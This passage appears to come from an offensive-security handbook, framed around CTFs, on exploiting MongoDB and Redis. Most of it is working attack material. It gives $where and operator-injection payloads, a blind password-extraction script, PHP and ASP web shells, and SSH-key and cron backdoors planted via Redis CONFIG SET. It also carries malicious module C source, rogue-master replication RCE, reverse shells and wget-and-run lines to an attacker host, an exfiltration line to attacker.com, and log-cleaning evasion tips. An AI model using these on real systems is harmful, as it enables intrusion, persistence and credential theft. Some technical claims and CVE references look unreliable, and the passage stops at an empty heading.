**MongoDB JavaScript Execution Contexts:**

1. **`$where` operator** - Executes JavaScript for query filtering
2. **`mapReduce()`** - Runs JavaScript for data aggregation
3. **`$function` aggregation operator** - Custom JavaScript in aggregation pipelines (MongoDB 4.4+)
4. **Stored JavaScript functions** - Server-side JavaScript stored in `system.js` collection

**JavaScript Injection via `$where`:**

**Vulnerable Query Construction:**

```javascript
// Node.js backend (VULNERABLE)
const searchTerm = req.query.search;
db.collection('products').find({
  $where: `this.name == '${searchTerm}'`
});
```

**Injection Payloads:**

**1. Breaking Out of String Context:**

```javascript
' || this.password.length > 0 || '
' || this.username == 'admin' || '
```

**2. Boolean-Based Data Extraction:**

```javascript
' || this.password.substring(0,1) == 'a' || '
' || this.password.match(/^admin/) || '
```

**3. Time-Based Blind Injection:**

```javascript
'; sleep(5000); var x='
' || (function(){var start = new Date(); while(new Date() - start < 5000); return true;})() || '
```

**4. Error-Based Injection:**

```javascript
'; throw new Error(this.password); var x='
' || (function(){throw new Error(JSON.stringify(db.getCollectionNames()))})() || '
```

**Advanced JavaScript Payload Construction:**

**Data Exfiltration via DNS (if external requests possible):** [Unverified - depends on MongoDB configuration and network policies]

```javascript
'; var http = require('http'); http.get('http://attacker.com/?data=' + this.password); var x='
```

**Iterating Through Collections:**

```javascript
' || (function(){
  var collections = db.getCollectionNames();
  for(var i=0; i<collections.length; i++){
    if(collections[i] == 'users') return true;
  }
  return false;
})() || '
```

**MapReduce Injection:**

If application uses MapReduce with user input:

```javascript
// Vulnerable MapReduce
db.collection.mapReduce(
  function() { emit(this.category, this.price); },
  function(key, values) { return Array.sum(values); },
  { query: { category: USER_INPUT } }
);
```

**Injection in map/reduce functions:**

```javascript
// Inject into map function
function() { 
  emit(this.category, this.price); 
  /* injected code here */
  db.users.find().forEach(function(u){
    emit('leak', u.password);
  });
}
```

**Practical JavaScript Injection Testing:**

**Manual Testing with Burp Suite:**

1. Identify input parameters that may be used in queries
2. Test for JavaScript context with basic payloads:

```
'
"
' || '1
" || "1
'; var x='
```

3. Observe error messages for JavaScript syntax errors
4. Test time-based payloads:

```
' || sleep(5000) || '
```

**Automated Testing Script:**

```python
import requests
import time

def test_js_injection(url, param_name):
    """Test for JavaScript injection in NoSQL queries"""
    
    # Time-based detection
    time_payloads = [
        "' || sleep(5000) || '",
        "'; sleep(5000); var x='",
        "\" || sleep(5000) || \"",
    ]
    
    print("[*] Testing for time-based JavaScript injection...")
    for payload in time_payloads:
        params = {param_name: payload}
        start = time.time()
        try:
            response = requests.get(url, params=params, timeout=10)
            elapsed = time.time() - start
            
            if elapsed >= 5:
                print(f"[+] VULNERABLE! Delay detected: {elapsed:.2f}s")
                print(f"[+] Payload: {payload}")
                return True
        except requests.Timeout:
            print(f"[+] VULNERABLE! Request timed out")
            print(f"[+] Payload: {payload}")
            return True
    
    # Boolean-based detection
    bool_payloads = [
        ("' || '1'=='1", "' || '1'=='2"),
        ("' || true || '", "' || false || '"),
    ]
    
    print("[*] Testing for boolean-based JavaScript injection...")
    for true_payload, false_payload in bool_payloads:
        params_true = {param_name: true_payload}
        params_false = {param_name: false_payload}
        
        resp_true = requests.get(url, params=params_true)
        resp_false = requests.get(url, params=params_false)
        
        if resp_true.text != resp_false.text:
            print(f"[+] VULNERABLE! Different responses detected")
            print(f"[+] True payload: {true_payload}")
            print(f"[+] False payload: {false_payload}")
            return True
    
    print("[-] No JavaScript injection detected")
    return False

# Usage
test_js_injection("http://target.com/api/search", "q")
```

**Character-by-Character Data Extraction:**

```python
def extract_field_value(url, field_name, known_chars=""):
    """Extract field value character by character"""
    import string
    
    charset = string.ascii_letters + string.digits + string.punctuation
    extracted = known_chars
    
    print(f"[*] Extracting {field_name}...")
    print(f"[*] Starting from: {extracted}")
    
    while True:
        found = False
        for char in charset:
            # Escape special characters
            test_char = char.replace("\\", "\\\\").replace("'", "\\'")
            
            # Payload to test if next character matches
            payload = f"' || this.{field_name}.substring(0,{len(extracted)+1}) == '{extracted}{test_char}' || '"
            
            params = {"search": payload}
            response = requests.get(url, params=params)
            
            # Adjust this condition based on application behavior
            if "found" in response.text.lower() or response.status_code == 200:
                extracted += char
                print(f"[+] Found: {extracted}")
                found = True
                break
        
        if not found:
            print(f"[+] Extraction complete: {extracted}")
            return extracted
        
        # Safety limit
        if len(extracted) > 100:
            print("[!] Reached length limit")
            return extracted

# Usage
password = extract_field_value("http://target.com/api/users", "password")
```

**Mitigation Bypasses:**

If application filters `$where`:

```javascript
// Try alternatives
{$expr: {$function: {body: "return true", args: [], lang: "js"}}}

// Use different operators
{$regex: ".*"}
{$ne: null}
```

**Important Considerations:**

[Unverified - depends on MongoDB version and configuration]: JavaScript execution via `$where` is disabled by default in some MongoDB configurations and deprecated in favor of aggregation framework for security reasons. MongoDB 4.4+ recommends using `$expr` and `$function` with strict sandboxing.

**Best Practices for Exploitation:**

1. Always test for different quote contexts (single, double, none)
2. Use time-based techniques when blind injection is suspected
3. Monitor for error messages that reveal query structure
4. Test both GET and POST parameters
5. Consider JSON body injection in addition to URL parameters
6. Verify findings manually before reporting

---

**Related Topics for Further Study:**

- **Server-Side JavaScript Injection (SSJI)** - Broader context beyond NoSQL
- **MongoDB Aggregation Pipeline Exploitation** - Modern MongoDB query methods
- **NoSQL Database Enumeration** - Fingerprinting MongoDB versions and configurations
- **Polyglot Payloads** - Payloads working across SQL and NoSQL contexts

---

## Redis Exploitation

### Unauthenticated Redis Access

Redis often runs without authentication in misconfigured environments, exposing it on port 6379 (default) or custom ports. Unauthenticated access allows full database control.

**Detection and Enumeration:**

```bash
# Port scanning
nmap -p 6379 <target_ip>
nmap -sV -p 6379 <target_ip>

# Banner grabbing
nc <target_ip> 6379
redis-cli -h <target_ip>
redis-cli -h <target_ip> -p <custom_port>

# Test authentication requirement
redis-cli -h <target_ip> ping
# Response "PONG" = no auth required
# Response "NOAUTH" = authentication required
```

**Information Gathering:**

```bash
# Connect to Redis
redis-cli -h <target_ip>

# Get server information
INFO
INFO server
INFO clients
INFO stats

# List all databases
INFO keyspace

# List configuration
CONFIG GET *
CONFIG GET dir
CONFIG GET dbfilename
CONFIG GET requirepass

# Switch databases (0-15 by default)
SELECT 0
SELECT 1

# List all keys in current database
KEYS *
SCAN 0 COUNT 100

# Get key type
TYPE <keyname>

# Get key value
GET <keyname>
HGETALL <keyname>  # For hash type
LRANGE <keyname> 0 -1  # For list type
SMEMBERS <keyname>  # For set type
```

**Common Writable Directories (Linux):**

- `/var/www/html/`
- `/tmp/`
- `/var/tmp/`
- `/home/<user>/.ssh/`
- `/usr/local/apache2/htdocs/`

**Common Writable Directories (Windows):**

- `C:\inetpub\wwwroot\`
- `C:\xampp\htdocs\`
- `C:\temp\`
- `C:\Users\<user>\AppData\Local\Temp\`

**SSH Key Writing (Linux):**

```bash
# Generate SSH key pair on attacker machine
ssh-keygen -t rsa -f redis_key

# Prepare the public key with proper Redis formatting
(echo -e "\n\n"; cat redis_key.pub; echo -e "\n\n") > redis_key_formatted.txt

# Connect to Redis
redis-cli -h <target_ip>

# Set working directory to SSH folder
CONFIG SET dir /home/<username>/.ssh/
# Or try: /root/.ssh/

# Set database filename
CONFIG SET dbfilename authorized_keys

# Write the key (from attacker machine)
cat redis_key_formatted.txt | redis-cli -h <target_ip> -x SET crackit

# Save to disk
SAVE

# Connect via SSH
ssh -i redis_key <username>@<target_ip>
```

**Web Shell Writing (Linux/Windows):**

```bash
# Linux example - PHP web shell
redis-cli -h <target_ip>
CONFIG SET dir /var/www/html/
CONFIG SET dbfilename shell.php
SET webshell "<?php system($_GET['cmd']); ?>"
SAVE

# Access: http://<target_ip>/shell.php?cmd=id

# Windows example - ASP web shell
CONFIG SET dir C:\inetpub\wwwroot\
CONFIG SET dbfilename shell.asp
SET webshell "<%response.write(CreateObject(\"WScript.Shell\").Exec(Request.QueryString(\"cmd\")).StdOut.ReadAll())%>"
SAVE
```

**Cron Job Backdoor (Linux):**

```bash
redis-cli -h <target_ip>
CONFIG SET dir /var/spool/cron/crontabs/
# Or: /var/spool/cron/ (CentOS/RHEL)
# Or: /etc/cron.d/ (alternative)

CONFIG SET dbfilename root
SET cronjob "\n\n*/1 * * * * /bin/bash -c 'bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1'\n\n"
SAVE

# Listen for connection
nc -nlvp <port>
```

### Redis Command Injection

When applications pass unsanitized user input to Redis commands, attackers can inject arbitrary Redis commands.

**Vulnerable Code Example (Python):**

```python
# VULNERABLE - user input directly in command
user_key = request.GET['key']
redis_client.execute_command(f"GET {user_key}")

# VULNERABLE - string concatenation
redis_client.get(user_input)  # Less vulnerable but depends on implementation
```

**Exploitation Techniques:**

**Newline Injection:**

```bash
# Payload structure
key\r\nCOMMAND\r\n

# Example: Inject CONFIG command
test\r\nCONFIG SET dir /var/www/html/\r\n

# Example: Write web shell via injection
test\r\nSET shell "<?php system($_GET['c']); ?>"\r\nCONFIG SET dir /var/www/html/\r\nCONFIG SET dbfilename s.php\r\nSAVE\r\n
```

**Lua Script Injection:**

```bash
# If application uses EVAL command
EVAL "return redis.call('CONFIG','SET','dir','/var/www/html/')" 0

# RCE via Lua (if sandbox escapes exist)
EVAL "return os.execute('whoami')" 0

# [Unverified] Note: Modern Redis versions have Lua sandbox restrictions, but older versions or misconfigurations may allow OS command execution
```

**Command Chaining:**

```bash
# Chain multiple commands
GET test
MULTI
SET exploit "payload"
CONFIG SET dir /tmp/
SAVE
EXEC

# Exploit via Redis Protocol (RESP)
*3\r\n$3\r\nSET\r\n$7\r\nexploit\r\n$7\r\npayload\r\n
```

**Gopher Protocol SSRF to Redis:**

When exploiting SSRF vulnerabilities, the Gopher protocol can send arbitrary Redis commands:

```bash
# Generate Gopher payload
# Example: Write SSH key via SSRF

# Redis commands (URL encoded)
gopher://<target_ip>:6379/_CONFIG%20SET%20dir%20/root/.ssh/%0D%0ACONFIG%20SET%20dbfilename%20authorized_keys%0D%0ASET%20key%20"ssh-rsa%20AAAA..."
```

### Module Loading for RCE

Redis supports dynamic module loading (since version 4.0), allowing C libraries to extend functionality. Attackers can load malicious modules for RCE.

**Detection:**

```bash
redis-cli -h <target_ip>
INFO modules
MODULE LIST

# Check Redis version (modules require >= 4.0)
INFO server | grep redis_version
```

**Exploitation Process:**

**1. Compile Malicious Module:**

```bash
# Download pre-built module or compile from source
git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand
cd RedisModules-ExecuteCommand
make

# Alternative: Use ready-made modules
git clone https://github.com/RicterZ/RedisModules-ExecuteCommand
```

**Example Module Code (exp.c):**

```c
#include "redismodule.h"
#include <stdlib.h>

int DoCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (argc != 2) return RedisModule_WrongArity(ctx);
    
    size_t cmd_len;
    const char *cmd = RedisModule_StringPtrLen(argv[1], &cmd_len);
    
    FILE *fp = popen(cmd, "r");
    char buffer[1024];
    RedisModuleString *result = RedisModule_CreateString(ctx, "", 0);
    
    while (fgets(buffer, sizeof(buffer), fp)) {
        RedisModule_StringAppendBuffer(ctx, result, buffer, strlen(buffer));
    }
    
    pclose(fp);
    RedisModule_ReplyWithString(ctx, result);
    return REDISMODULE_OK;
}

int RedisModule_OnLoad(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (RedisModule_Init(ctx, "system", 1, REDISMODULE_APIVER_1) == REDISMODULE_ERR)
        return REDISMODULE_ERR;
    
    if (RedisModule_CreateCommand(ctx, "system.exec", DoCommand, "readonly", 1, 1, 1) == REDISMODULE_ERR)
        return REDISMODULE_ERR;
    
    return REDISMODULE_OK;
}
```

**Compile:**

```bash
gcc -fPIC -shared -o module.so exp.c -I/path/to/redis/src/
# Or using Kali's system includes:
gcc -fPIC -shared -o module.so exp.c
```

**2. Transfer Module to Target:**

```bash
# Method 1: Direct upload (if file upload exists)
curl -F "file=@module.so" http://<target_ip>/upload

# Method 2: Base64 transfer via Redis
base64 module.so > module_b64.txt
# Split into chunks if needed
split -b 1000000 module_b64.txt chunk_

# In Redis:
redis-cli -h <target_ip>
SET chunk1 "<base64_part1>"
SET chunk2 "<base64_part2>"
# ... then reconstruct on target
```

**3. Load Module:**

```bash
redis-cli -h <target_ip>

# Load module from local path (requires file system access)
MODULE LOAD /tmp/module.so

# Alternative: Load from remote path (if allowed)
MODULE LOAD /var/www/html/uploads/module.so

# Verify module loaded
MODULE LIST
```

**4. Execute Commands:**

```bash
# Using the custom module command
system.exec "id"
system.exec "whoami"
system.exec "cat /etc/passwd"

# Reverse shell
system.exec "bash -c 'bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1'"

# Download and execute
system.exec "wget http://<attacker_ip>/shell.sh -O /tmp/s.sh && bash /tmp/s.sh"
```

**Master-Slave Replication RCE (CVE-2019-10899 related):**

**[Unverified beyond proof-of-concept demonstrations]** This technique exploits Redis replication to load modules:

```bash
# Attacker sets up rogue Redis master with malicious module
redis-server --port 6380 --dir /tmp --dbfilename exp.so

# On victim Redis:
redis-cli -h <target_ip>
SLAVEOF <attacker_ip> 6380
# Victim replicates malicious module
MODULE LOAD /tmp/exp.so

# Automated tool
git clone https://github.com/Ridter/redis-rce
python3 redis-rce.py -r <target_ip> -L <attacker_ip> -f module.so
```

**Defense Bypass Considerations:**

- **Protected Mode:** Redis 3.2+ enables protected mode by default (only localhost access). Disabled if `bind` is set or password configured.
    
- **Rename Commands:** Administrators may rename dangerous commands:
    
    ```bash
    # In redis.conf
    rename-command CONFIG ""
    rename-command MODULE ""
    ```
    
    Check with: `CONFIG GET *` (if CONFIG not renamed)
    
- **Disabled Commands:** Check for command restrictions:
    
    ```bash
    INFO commandstats
    # Attempt restricted commands to identify blocks
    ```
    

**Metasploit Modules:**

```bash
# Redis unauthenticated access
use auxiliary/scanner/redis/redis_server

# Redis file upload
use exploit/linux/redis/redis_replication_cmd_exec
set RHOST <target_ip>
set LHOST <attacker_ip>
exploit
```

**Important Tools:**

- **redis-cli:** Default Redis command-line interface (pre-installed on Kali)
- **redis-tools:** Package containing Redis utilities
- **RedisModules-ExecuteCommand:** Pre-built RCE modules
- **redis-rce.py:** Automated master-slave exploitation script

**Key Security Misconfigurations to Identify:**

1. No authentication (`requirepass` not set)
2. Bound to 0.0.0.0 or public interface
3. Protected mode disabled
4. Dangerous commands not renamed/disabled
5. Writable directories accessible via `CONFIG SET dir`
6. Module loading enabled without restrictions

---

**Related Topics for Comprehensive Redis Exploitation:**

- Redis Lua sandbox escapes (version-specific)
- Redis persistence mechanisms (RDB vs AOF exploitation)
- Redis Sentinel/Cluster exploitation
- Redis protocol (RESP) manual construction for advanced injection

---

### EVAL Script Execution

Redis EVAL allows execution of Lua scripts server-side, which can be exploited when Redis is exposed without authentication or with weak credentials. The EVAL command executes arbitrary Lua code with access to Redis data and limited system interaction.

**Basic EVAL Syntax:**

```bash
redis-cli -h <target_ip> -p 6379 EVAL "return redis.call('GET', 'key')" 0
```

**Testing for Unauthenticated Access:**

```bash
redis-cli -h <target_ip> -p 6379 ping
# Response: PONG indicates no auth required

redis-cli -h <target_ip> -p 6379 INFO
# Displays server configuration and version
```

**Exploiting EVAL for Information Gathering:**

```bash
# List all keys
redis-cli -h <target_ip> EVAL "return redis.call('KEYS', '*')" 0

# Read specific key
redis-cli -h <target_ip> EVAL "return redis.call('GET', 'sensitive_key')" 0

# Enumerate database configuration
redis-cli -h <target_ip> EVAL "return redis.call('CONFIG', 'GET', '*')" 0
```

**Lua Script File Execution:**

```lua
-- script.lua example
local data = redis.call('KEYS', '*')
return data
```

```bash
redis-cli -h <target_ip> --eval script.lua
```

**Writing Files via EVAL (Path Traversal):** [Inference] Redis EVAL's Lua environment has limited file system access by default. Direct file writes typically require combining EVAL with CONFIG SET and SAVE commands rather than pure Lua file operations.

```bash
# Change save directory
redis-cli -h <target_ip> CONFIG SET dir /var/www/html/

# Set dbfilename to webshell
redis-cli -h <target_ip> CONFIG SET dbfilename shell.php

# Create malicious key
redis-cli -h <target_ip> SET payload '<?php system($_GET["cmd"]); ?>'

# Force save
redis-cli -h <target_ip> SAVE
```

**Lua Sandbox Escape Considerations:** Redis Lua sandbox blocks `os.execute()`, `io.popen()`, and most file operations. Historical vulnerabilities (CVE-2015-4335) allowed sandbox escapes in older versions (< 3.0.0), but modern Redis versions have patched direct execution paths.

**EVALSHA for Cached Scripts:**

```bash
# Load script and get SHA1
SCRIPT_SHA=$(redis-cli -h <target_ip> SCRIPT LOAD "return redis.call('KEYS', '*')")

# Execute by SHA1 (stealthier, no script in command history)
redis-cli -h <target_ip> EVALSHA $SCRIPT_SHA 0
```

**Dangerous EVAL Patterns in CTFs:**

- Configuration leakage via `CONFIG GET`
- Database dumping via `KEYS` and `DUMP` commands
- Web shell injection through directory/filename manipulation
- Session hijacking by accessing serialized session data

### Master-Slave Replication Abuse

Redis replication allows a slave instance to synchronize data from a master. Attackers can leverage this to load malicious Redis modules (.so files) containing arbitrary code execution capabilities.

**Attack Prerequisites:**

- Network access to target Redis (port 6379 default)
- No authentication or compromised credentials
- Redis version with module support (>= 4.0)

**Tools for Replication Exploitation:**

**Redis-Rogue-Server (https://github.com/n0b0dyCN/redis-rogue-server):**

```bash
# Clone tool
git clone https://github.com/n0b0dyCN/redis-rogue-server.git
cd redis-rogue-server

# Basic command execution
python3 redis-rogue-server.py --rhost <target_ip> --rport 6379 --lhost <attacker_ip> --lport 21000 --exp system.so --cmd "id"

# Reverse shell
python3 redis-rogue-server.py --rhost <target_ip> --rport 6379 --lhost <attacker_ip> --lport 21000 --exp system.so --cmd "bash -c 'bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1'"
```

**Manual Replication Attack Process:**

1. **Create Malicious Redis Module:**

```c
// exp.c - Simple command execution module
#include "redismodule.h"
#include <stdlib.h>

int DoCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (argc != 2) return RedisModule_WrongArity(ctx);
    
    size_t cmd_len;
    const char *cmd = RedisModule_StringPtrLen(argv[1], &cmd_len);
    system(cmd);
    
    return RedisModule_ReplyWithSimpleString(ctx, "OK");
}

int RedisModule_OnLoad(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (RedisModule_Init(ctx, "system", 1, REDISMODULE_APIVER_1) == REDISMODULE_ERR)
        return REDISMODULE_ERR;
    
    if (RedisModule_CreateCommand(ctx, "system.exec", DoCommand, "readonly", 0, 0, 0) == REDISMODULE_ERR)
        return REDISMODULE_ERR;
    
    return REDISMODULE_OK;
}
```

Compile:

```bash
gcc -fPIC -shared -o exp.so exp.c -I/path/to/redis/src
```

2. **Set Up Rogue Master Server:**

```python
# Simplified concept - use redis-rogue-server in practice
import socket

# Listen as fake Redis master
sock = socket.socket()
sock.bind(('0.0.0.0', 21000))
sock.listen(1)

# Wait for victim Redis to connect as slave
# Send malicious module via FULLRESYNC
# Module gets loaded on victim
```

3. **Trigger Replication on Target:**

```bash
redis-cli -h <target_ip> SLAVEOF <attacker_ip> 21000
redis-cli -h <target_ip> MODULE LOAD /tmp/exp.so
redis-cli -h <target_ip> system.exec "whoami"
```

4. **Cleanup:**

```bash
redis-cli -h <target_ip> SLAVEOF NO ONE
redis-cli -h <target_ip> MODULE UNLOAD system
```

**Detection Evasion:**

- Use `SLAVEOF NO ONE` immediately after module load
- Clean `/var/log/redis/` if accessible
- Module names that blend with legitimate modules

**Common CTF Scenarios:**

- Redis exposed on internal network after initial foothold
- Privilege escalation when Redis runs as root
- Lateral movement by compromising centralized cache servers

[Unverified] Not all Redis configurations support external module loading. The `enable-module-command` configuration option (default: yes in most distributions) must be enabled.

### Persistence File Manipulation

Redis persistence mechanisms (RDB snapshots and AOF logs) can be manipulated to inject malicious data into specific file paths, enabling web shells, SSH key injection, or cron job abuse.

**Redis Persistence Methods:**

- **RDB (Redis Database):** Point-in-time binary snapshots
- **AOF (Append-Only File):** Log of all write operations

**Common Injection Targets:**

- Web directories: `/var/www/html/`, `/usr/share/nginx/html/`
- SSH: `~/.ssh/authorized_keys`
- Cron: `/etc/cron.d/`, `/var/spool/cron/crontabs/`
- User home directories with writable permissions

**Web Shell Injection via RDB:**

```bash
# Connect to Redis
redis-cli -h <target_ip>

# Configure save location
CONFIG SET dir /var/www/html/
CONFIG SET dbfilename shell.php

# Flush existing data (optional, cleaner payload)
FLUSHALL

# Inject PHP payload with padding
SET payload "\n\n\n<?php system($_GET['cmd']); ?>\n\n\n"

# Force save
SAVE
# or for background save: BGSAVE

# Access webshell
# http://<target_ip>/shell.php?cmd=whoami
```

**SSH Key Injection via RDB:**

```bash
redis-cli -h <target_ip>

# Target user's SSH directory
CONFIG SET dir /home/victim/.ssh/
CONFIG SET dbfilename authorized_keys

FLUSHALL

# Generate SSH key pair locally
ssh-keygen -t rsa -f redis_key -N ""

# Inject public key with padding (Redis RDB adds binary data)
SET key1 "\n\n"
SET key2 "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC... attacker@kali"
SET key3 "\n\n"

SAVE

# SSH with private key
ssh -i redis_key victim@<target_ip>
```

[Inference] The padding with newlines (`\n\n\n`) helps isolate the payload from Redis RDB binary formatting artifacts that might break parsing in target applications.

**Cron Job Injection:**

```bash
redis-cli -h <target_ip>

CONFIG SET dir /var/spool/cron/crontabs/
CONFIG SET dbfilename root

FLUSHALL

# Reverse shell via cron (runs every minute)
SET cron "\n\n*/1 * * * * bash -c 'bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1'\n\n"

SAVE
```

**AOF Manipulation (Advanced):**

AOF files log all write commands as plain text, making them cleaner for payload injection but requiring AOF to be enabled.

```bash
# Enable AOF
CONFIG SET appendonly yes
CONFIG SET dir /var/www/html/
CONFIG SET appendfilename shell.php

# Write payload
SET payload "<?php system($_GET['cmd']); ?>"

# Force AOF rewrite
BGREWRITEAOF
```

**Checking Writeable Directories:**

```bash
redis-cli -h <target_ip> CONFIG GET dir
# Returns current working directory

# Common writable paths in CTFs:
# /tmp/
# /var/tmp/
# /dev/shm/
# /var/www/html/ (if www-data/redis permissions align)
```

**File Permission Considerations:**

[Inference] Success depends on the Redis process user having write permissions to the target directory. Default Redis installations often run as user `redis` with limited file system access.

```bash
# Check Redis process user (from target if accessible)
ps aux | grep redis
# Look for UID/username

# Common writable scenarios in CTFs:
# - Redis misconfigured to run as root
# - Web directory with group-write permissions
# - User home directories with loose ACLs
```

**BGSAVE vs SAVE:**

- `SAVE`: Blocking, freezes Redis until complete (more reliable for CTFs)
- `BGSAVE`: Non-blocking background save (may require timing)

```bash
# Verify save completed
redis-cli -h <target_ip> LASTSAVE
# Returns Unix timestamp of last successful save
```

**Detecting Redis Persistence Configuration:**

```bash
redis-cli -h <target_ip> INFO persistence

# Key fields:
# rdb_last_save_time: Last RDB save timestamp
# aof_enabled: 0 or 1
# rdb_changes_since_last_save: Unsaved operations count
```

**Cleanup After Exploitation:**

```bash
# Restore original config
CONFIG SET dir /var/lib/redis/
CONFIG SET dbfilename dump.rdb

# Remove injected keys
DEL payload
DEL cron

# New clean save
SAVE
```

**CTF-Specific Tips:**

- Check `/var/log/redis/redis-server.log` for error messages revealing file paths
- Use `CONFIG GET *` to enumerate all settings and find writable paths
- Test file writes to `/tmp/` first to verify permissions
- Combine with path traversal in `dir` parameter: `CONFIG SET dir /var/www/../../../../tmp/`

**Tool: RedisModules-ExecuteCommand (Alternative to Replication):**

If direct file access exists, pre-compiled modules can be manually placed:

```bash
# Copy malicious module to accessible path
scp exp.so user@target:/tmp/

# Load via Redis
redis-cli -h <target_ip> MODULE LOAD /tmp/exp.so
redis-cli -h <target_ip> system.exec "id"
```

---

## MongoDB Exploitation

### Unauthenticated MongoDB Access

MongoDB instances without authentication enabled allow direct database access when bound to external interfaces. This misconfiguration remains common in CTF environments and real-world deployments.

**Discovery and Enumeration:**

```bash
# Nmap service detection
nmap -sV -p 27017,27018,27019 <target>

# Full MongoDB service scan
nmap -p 27017 --script mongodb-info,mongodb-databases <target>

# Banner grabbing
nc -nv <target> 27017
```

**Direct Connection Methods:**

```bash
# mongo client (legacy, deprecated after MongoDB 5.0)
mongo <target>:27017
mongo <target>:27017/<database_name>

# mongosh (modern MongoDB shell)
mongosh "mongodb://<target>:27017"
mongosh "mongodb://<target>:27017/<database_name>"

# With explicit no-auth flag
mongosh "mongodb://<target>:27017" --authenticationDatabase admin
```

**Initial Enumeration Commands:**

```javascript
// List all databases
show dbs

// Switch to database
use <database_name>

// List collections in current database
show collections

// Get database statistics
db.stats()

// List all users (requires admin access)
db.system.users.find()

// Get current user privileges
db.runCommand({connectionStatus: 1})

// Server status and version
db.version()
db.serverStatus()
```

**Common Default Databases:**

- `admin` - administrative database containing user credentials
- `config` - sharded cluster configuration
- `local` - replication and instance-specific data
- Application-specific databases (enumerate with `show dbs`)

**Authentication Check:**

```javascript
// Attempt to list users (fails if auth required)
db.getUsers()

// Check authentication status
db.runCommand({getParameter: 1, authenticationMechanisms: 1})
```

### Query Operator Injection

MongoDB query operators enable injection attacks when user input is embedded in queries without sanitization, particularly in web applications using NoSQL backends.

**Vulnerable Query Pattern:**

```javascript
// Vulnerable Node.js/Express example
app.post('/login', (req, res) => {
    db.collection('users').findOne({
        username: req.body.username,
        password: req.body.password
    })
})
```

**Authentication Bypass Payloads:**

```json
// Standard bypass using $ne (not equal)
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": "admin", "password": {"$ne": ""}}

// Using $gt (greater than)
{"username": "admin", "password": {"$gt": ""}}

// Regex-based bypass
{"username": {"$regex": "^admin"}, "password": {"$ne": null}}

// Using $in operator
{"username": {"$in": ["admin", "administrator"]}, "password": {"$ne": null}}
```

**Information Extraction via Boolean Injection:**

```json
// Password length enumeration
{"username": "admin", "password": {"$regex": "^.{1}$"}}  // 1 char
{"username": "admin", "password": {"$regex": "^.{8}$"}}  // 8 chars

// Character-by-character extraction
{"username": "admin", "password": {"$regex": "^a"}}
{"username": "admin", "password": {"$regex": "^ad"}}
{"username": "admin", "password": {"$regex": "^adm"}}

// Case-insensitive extraction
{"username": "admin", "password": {"$regex": "^pass", "$options": "i"}}
```

**Conditional Operators for Logic Manipulation:**

```json
// $where injection (if enabled)
{"$where": "this.username == 'admin' && this.password.length > 0"}

// $expr operator exploitation
{"$expr": {"$eq": ["$username", "admin"]}}

// $or operator for multiple conditions
{"$or": [{"username": "admin"}, {"username": "administrator"}]}
```

**URL-Encoded POST Payloads:**

```
username[$ne]=null&password[$ne]=null
username=admin&password[$regex]=^.*
username[$in][]=admin&username[$in][]=root&password[$ne]=null
```

**Testing Commands in MongoDB Shell:**

```javascript
// Test authentication bypass
db.users.find({username: {$ne: null}, password: {$ne: null}})

// Test regex extraction
db.users.find({username: "admin", password: {$regex: "^a"}})

// Dump all documents with operator injection
db.users.find({username: {$gt: ""}})
```

### JavaScript Code Execution

MongoDB versions prior to 4.0 allowed JavaScript execution in various contexts. While restricted in modern versions, legacy instances and specific configurations remain vulnerable.

**$where Operator Exploitation:**

```javascript
// Basic command execution (requires $where to be enabled)
db.collection.find({$where: "sleep(5000)"})

// Boolean-based data extraction
db.users.find({$where: "this.username == 'admin' && this.password[0] == 'a'"})

// Heap spraying for extraction
db.users.find({$where: "if(this.password[0]=='a'){sleep(5000);return true;}return false;"})
```

**mapReduce Function Exploitation:**

```javascript
// Data exfiltration via mapReduce
db.collection.mapReduce(
    function() { emit(this.username, this.password); },
    function(key, values) { return Array.sum(values); },
    { out: "leaked_data" }
)

// Command execution in map function
db.collection.mapReduce(
    function() { 
        var cmd = run("whoami");
        emit(cmd, 1); 
    },
    function(k,v) { return 1; },
    { out: "results" }
)
```

**$function Operator (MongoDB 4.4+):**

[Unverified]: The $function operator behavior varies by configuration and version.

```javascript
// Define custom function
db.collection.aggregate([
    {$addFields: {
        output: {
            $function: {
                body: function(name) { return "Hello " + name; },
                args: ["$username"],
                lang: "js"
            }
        }
    }}
])
```

**group() Function Exploitation:**

```javascript
// Legacy group command with JavaScript
db.collection.group({
    key: {username: 1},
    reduce: function(curr, result) { result.total += 1; },
    initial: {total: 0}
})

// Data extraction via group
db.collection.group({
    key: {},
    reduce: function(obj, prev) { prev.data.push(obj.password); },
    initial: {data: []}
})
```

**Server-Side JavaScript Configuration Check:**

```javascript
// Check if server-side JS is enabled
db.adminCommand({getParameter: 1, javascriptEnabled: 1})

// Attempt to disable (requires admin)
db.adminCommand({setParameter: 1, javascriptEnabled: false})
```

**Injection via Web Application:**

```json
// POST payload with $where injection
{"username": "admin", "$where": "this.password.match(/^adm/)"}

// Combined with sleep for timing attacks
{"$where": "this.username=='admin' && (this.password[0]=='a'?sleep(3000):1)"}
```

### Admin Credential Theft

Administrative credentials in MongoDB are stored in the `admin.system.users` collection using SCRAM-SHA-1 or SCRAM-SHA-256 hashing (depending on version).

**Credential Location and Access:**

```javascript
// Switch to admin database
use admin

// Dump all users
db.system.users.find()
db.system.users.find().pretty()

// Extract specific fields
db.system.users.find({}, {user: 1, db: 1, credentials: 1})

// List all database users across all databases
db.system.users.find({}, {user: 1, db: 1, roles: 1})
```

**Credential Structure:**

```javascript
{
    "_id": "admin.root",
    "user": "root",
    "db": "admin",
    "credentials": {
        "SCRAM-SHA-1": {
            "iterationCount": 10000,
            "salt": "base64_encoded_salt",
            "storedKey": "base64_encoded_key",
            "serverKey": "base64_encoded_key"
        },
        "SCRAM-SHA-256": { /* similar structure */ }
    },
    "roles": [{"role": "root", "db": "admin"}]
}
```

**Hash Extraction for Offline Cracking:**

```bash
# Extract to file for cracking
mongosh "mongodb://<target>:27017/admin" --eval "db.system.users.find().forEach(printjson)" > users.json

# Alternative using mongoexport
mongoexport --host <target> --db admin --collection system.users --out users.json
```

**Cracking MongoDB Credentials:**

